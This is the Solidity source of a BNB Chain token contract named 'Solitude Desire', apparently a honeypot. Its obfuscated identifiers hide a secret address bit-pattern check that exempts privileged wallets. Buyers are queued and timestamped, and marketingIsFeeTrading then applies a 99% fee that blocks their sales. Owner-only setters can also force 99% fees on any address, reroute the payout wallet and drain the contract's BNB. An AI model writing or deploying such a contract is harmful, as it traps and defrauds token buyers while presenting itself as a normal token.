/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SolitudeDesire is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Solitude Desire ";
    string constant _symbol = "SolitudeDesire";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private launchedReceiverTeamBots;
    mapping(address => bool) private feeLiquidityBotsReceiverLaunched;
    mapping(address => bool) private txBotsSwapExempt;
    mapping(address => bool) private maxLiquidityReceiverMin;
    mapping(address => uint256) private swapLaunchedTradingTxMode;
    mapping(uint256 => address) private tradingMarketingWalletFee;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private swapLimitMarketingFee = 0;
    uint256 private teamBotsIsLaunched = 6;

    //SELL FEES
    uint256 private botsExemptFeeBurn = 0;
    uint256 private buyLiquidityLaunchedMarketing = 6;

    uint256 private sellTradingModeMin = teamBotsIsLaunched + swapLimitMarketingFee;
    uint256 private buyLaunchedIsTradingFee = 100;

    address private autoBurnReceiverMode = (msg.sender); // auto-liq address
    address private walletTeamMinLaunchedMax = (0x189CFC33caA4816fBe4260E1FFfFf1b0CAca28f5); // marketing address
    address private feeSwapBuyLaunchedMode = DEAD;
    address private tradingMinBurnWallet = DEAD;
    address private minLimitFeeSwap = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private launchedTxSwapExempt;
    uint256 private launchedTxExemptBurnFee;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private txReceiverExemptMin;
    uint256 private tradingSellSwapLiquidity;
    uint256 private receiverAutoFeeTradingMaxBots;
    uint256 private tradingBurnMinLimitReceiver;
    uint256 private autoTxBurnLaunchedMin;

    bool private modeSwapLaunchedReceiver = true;
    bool private maxLiquidityReceiverMinMode = true;
    bool private autoBurnIsLiquidity = true;
    bool private launchedModeMarketingMax = true;
    bool private modeMaxExemptLaunched = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private swapMarketingIsLaunchedModeTeamSell = _totalSupply / 1000; // 0.1%

    
    uint256 private botsLiquidityFeeSell = 0;
    uint256 private modeWalletBurnMin = 0;
    uint256 private maxAutoFeeMarketing = 0;
    bool private minTeamLaunchedSwapFee = false;
    uint256 private buySwapModeBurn = 0;
    uint256 private minReceiverTradingIsBurn = 0;
    bool private tradingSellLaunchedLiquiditySwapTeamTx = false;
    bool private receiverTxIsMin = false;
    uint256 private liquidityMarketingBurnLaunched = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        txReceiverExemptMin = true;

        launchedReceiverTeamBots[msg.sender] = true;
        launchedReceiverTeamBots[address(this)] = true;

        feeLiquidityBotsReceiverLaunched[msg.sender] = true;
        feeLiquidityBotsReceiverLaunched[0x0000000000000000000000000000000000000000] = true;
        feeLiquidityBotsReceiverLaunched[0x000000000000000000000000000000000000dEaD] = true;
        feeLiquidityBotsReceiverLaunched[address(this)] = true;

        txBotsSwapExempt[msg.sender] = true;
        txBotsSwapExempt[0x0000000000000000000000000000000000000000] = true;
        txBotsSwapExempt[0x000000000000000000000000000000000000dEaD] = true;
        txBotsSwapExempt[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return limitBurnTxReceiverFeeModeBots(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return limitBurnTxReceiverFeeModeBots(sender, recipient, amount);
    }

    function limitBurnTxReceiverFeeModeBots(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = buyTradingBurnWallet(sender) || buyTradingBurnWallet(recipient);
        
        if (maxAutoFeeMarketing != buyLiquidityLaunchedMarketing) {
            maxAutoFeeMarketing = swapLimitMarketingFee;
        }

        if (buySwapModeBurn != maxAutoFeeMarketing) {
            buySwapModeBurn = swapMarketingIsLaunchedModeTeamSell;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                exemptModeMarketingSwapReceiver();
            }
            if (!bLimitTxWalletValue) {
                receiverTradingTxLiquidityFee(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return sellExemptWalletLiquidity(sender, recipient, amount);}

        if (!launchedReceiverTeamBots[sender] && !launchedReceiverTeamBots[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || txBotsSwapExempt[sender] || txBotsSwapExempt[recipient], "Max TX Limit has been triggered");

        if (swapLaunchedExemptMarketing()) {limitWalletSwapMin();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = autoModeLimitTxBurnLiquidityWallet(sender) ? swapLiquidityTradingBurn(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function sellExemptWalletLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function autoModeLimitTxBurnLiquidityWallet(address sender) internal view returns (bool) {
        return !feeLiquidityBotsReceiverLaunched[sender];
    }

    function exemptBurnSellReceiverMin(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            sellTradingModeMin = buyLiquidityLaunchedMarketing + botsExemptFeeBurn;
            return marketingIsFeeTrading(sender, sellTradingModeMin);
        }
        if (!selling && sender == uniswapV2Pair) {
            sellTradingModeMin = teamBotsIsLaunched + swapLimitMarketingFee;
            return sellTradingModeMin;
        }
        return marketingIsFeeTrading(sender, sellTradingModeMin);
    }

    function swapLiquidityTradingBurn(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (minTeamLaunchedSwapFee == minTeamLaunchedSwapFee) {
            minTeamLaunchedSwapFee = receiverTxIsMin;
        }

        if (maxAutoFeeMarketing != botsLiquidityFeeSell) {
            maxAutoFeeMarketing = buySwapModeBurn;
        }

        if (buySwapModeBurn == sellTradingModeMin) {
            buySwapModeBurn = modeWalletBurnMin;
        }


        uint256 feeAmount = amount.mul(exemptBurnSellReceiverMin(sender, receiver == uniswapV2Pair)).div(buyLaunchedIsTradingFee);

        if (maxLiquidityReceiverMin[sender] || maxLiquidityReceiverMin[receiver]) {
            feeAmount = amount.mul(99).div(buyLaunchedIsTradingFee);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function buyTradingBurnWallet(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function marketingIsFeeTrading(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = swapLaunchedTradingTxMode[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function receiverTradingTxLiquidityFee(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        tradingMarketingWalletFee[exemptLimitValue] = addr;
    }

    function exemptModeMarketingSwapReceiver() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (swapLaunchedTradingTxMode[tradingMarketingWalletFee[i]] == 0) {
                    swapLaunchedTradingTxMode[tradingMarketingWalletFee[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(walletTeamMinLaunchedMax).transfer(amountBNB * amountPercentage / 100);
    }

    function swapLaunchedExemptMarketing() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    modeMaxExemptLaunched &&
    _balances[address(this)] >= swapMarketingIsLaunchedModeTeamSell;
    }

    function limitWalletSwapMin() internal swapping {
        
        if (botsLiquidityFeeSell == swapLimitMarketingFee) {
            botsLiquidityFeeSell = swapLimitMarketingFee;
        }

        if (buySwapModeBurn != swapMarketingIsLaunchedModeTeamSell) {
            buySwapModeBurn = sellTradingModeMin;
        }

        if (maxAutoFeeMarketing != sellTradingModeMin) {
            maxAutoFeeMarketing = botsLiquidityFeeSell;
        }


        uint256 amountToLiquify = swapMarketingIsLaunchedModeTeamSell.mul(swapLimitMarketingFee).div(sellTradingModeMin).div(2);
        uint256 amountToSwap = swapMarketingIsLaunchedModeTeamSell.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (liquidityMarketingBurnLaunched != botsExemptFeeBurn) {
            liquidityMarketingBurnLaunched = buyLiquidityLaunchedMarketing;
        }

        if (modeWalletBurnMin != swapMarketingIsLaunchedModeTeamSell) {
            modeWalletBurnMin = buyLaunchedIsTradingFee;
        }

        if (receiverTxIsMin == launchedModeMarketingMax) {
            receiverTxIsMin = modeSwapLaunchedReceiver;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = sellTradingModeMin.sub(swapLimitMarketingFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(swapLimitMarketingFee).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(teamBotsIsLaunched).div(totalETHFee);
        
        if (buySwapModeBurn != teamBotsIsLaunched) {
            buySwapModeBurn = buyLaunchedIsTradingFee;
        }

        if (receiverTxIsMin != launchedModeMarketingMax) {
            receiverTxIsMin = launchedModeMarketingMax;
        }


        payable(walletTeamMinLaunchedMax).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoBurnReceiverMode,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getModeMaxExemptLaunched() public view returns (bool) {
        if (modeMaxExemptLaunched == launchedModeMarketingMax) {
            return launchedModeMarketingMax;
        }
        return modeMaxExemptLaunched;
    }
    function setModeMaxExemptLaunched(bool a0) public onlyOwner {
        if (modeMaxExemptLaunched != modeMaxExemptLaunched) {
            modeMaxExemptLaunched=a0;
        }
        modeMaxExemptLaunched=a0;
    }

    function getBuyLaunchedIsTradingFee() public view returns (uint256) {
        if (buyLaunchedIsTradingFee == botsExemptFeeBurn) {
            return botsExemptFeeBurn;
        }
        if (buyLaunchedIsTradingFee == botsExemptFeeBurn) {
            return botsExemptFeeBurn;
        }
        return buyLaunchedIsTradingFee;
    }
    function setBuyLaunchedIsTradingFee(uint256 a0) public onlyOwner {
        if (buyLaunchedIsTradingFee != maxAutoFeeMarketing) {
            maxAutoFeeMarketing=a0;
        }
        buyLaunchedIsTradingFee=a0;
    }

    function getMaxLiquidityReceiverMin(address a0) public view returns (bool) {
        if (a0 == autoBurnReceiverMode) {
            return receiverTxIsMin;
        }
            return maxLiquidityReceiverMin[a0];
    }
    function setMaxLiquidityReceiverMin(address a0,bool a1) public onlyOwner {
        maxLiquidityReceiverMin[a0]=a1;
    }

    function getLaunchedModeMarketingMax() public view returns (bool) {
        if (launchedModeMarketingMax != minTeamLaunchedSwapFee) {
            return minTeamLaunchedSwapFee;
        }
        return launchedModeMarketingMax;
    }
    function setLaunchedModeMarketingMax(bool a0) public onlyOwner {
        launchedModeMarketingMax=a0;
    }

    function getTradingMarketingWalletFee(uint256 a0) public view returns (address) {
        if (a0 == liquidityMarketingBurnLaunched) {
            return walletTeamMinLaunchedMax;
        }
            return tradingMarketingWalletFee[a0];
    }
    function setTradingMarketingWalletFee(uint256 a0,address a1) public onlyOwner {
        if (a0 == minReceiverTradingIsBurn) {
            walletTeamMinLaunchedMax=a1;
        }
        tradingMarketingWalletFee[a0]=a1;
    }

    function getWalletTeamMinLaunchedMax() public view returns (address) {
        if (walletTeamMinLaunchedMax == tradingMinBurnWallet) {
            return tradingMinBurnWallet;
        }
        return walletTeamMinLaunchedMax;
    }
    function setWalletTeamMinLaunchedMax(address a0) public onlyOwner {
        if (walletTeamMinLaunchedMax != walletTeamMinLaunchedMax) {
            walletTeamMinLaunchedMax=a0;
        }
        if (walletTeamMinLaunchedMax == feeSwapBuyLaunchedMode) {
            feeSwapBuyLaunchedMode=a0;
        }
        if (walletTeamMinLaunchedMax != walletTeamMinLaunchedMax) {
            walletTeamMinLaunchedMax=a0;
        }
        walletTeamMinLaunchedMax=a0;
    }

    function getBuySwapModeBurn() public view returns (uint256) {
        if (buySwapModeBurn != sellTradingModeMin) {
            return sellTradingModeMin;
        }
        if (buySwapModeBurn == liquidityMarketingBurnLaunched) {
            return liquidityMarketingBurnLaunched;
        }
        if (buySwapModeBurn != swapLimitMarketingFee) {
            return swapLimitMarketingFee;
        }
        return buySwapModeBurn;
    }
    function setBuySwapModeBurn(uint256 a0) public onlyOwner {
        if (buySwapModeBurn != liquidityMarketingBurnLaunched) {
            liquidityMarketingBurnLaunched=a0;
        }
        if (buySwapModeBurn == buyLaunchedIsTradingFee) {
            buyLaunchedIsTradingFee=a0;
        }
        if (buySwapModeBurn == swapMarketingIsLaunchedModeTeamSell) {
            swapMarketingIsLaunchedModeTeamSell=a0;
        }
        buySwapModeBurn=a0;
    }

    function getMinTeamLaunchedSwapFee() public view returns (bool) {
        if (minTeamLaunchedSwapFee != autoBurnIsLiquidity) {
            return autoBurnIsLiquidity;
        }
        return minTeamLaunchedSwapFee;
    }
    function setMinTeamLaunchedSwapFee(bool a0) public onlyOwner {
        if (minTeamLaunchedSwapFee != modeMaxExemptLaunched) {
            modeMaxExemptLaunched=a0;
        }
        if (minTeamLaunchedSwapFee != maxLiquidityReceiverMinMode) {
            maxLiquidityReceiverMinMode=a0;
        }
        if (minTeamLaunchedSwapFee != tradingSellLaunchedLiquiditySwapTeamTx) {
            tradingSellLaunchedLiquiditySwapTeamTx=a0;
        }
        minTeamLaunchedSwapFee=a0;
    }

    function getLaunchedReceiverTeamBots(address a0) public view returns (bool) {
        if (a0 == autoBurnReceiverMode) {
            return modeSwapLaunchedReceiver;
        }
            return launchedReceiverTeamBots[a0];
    }
    function setLaunchedReceiverTeamBots(address a0,bool a1) public onlyOwner {
        launchedReceiverTeamBots[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}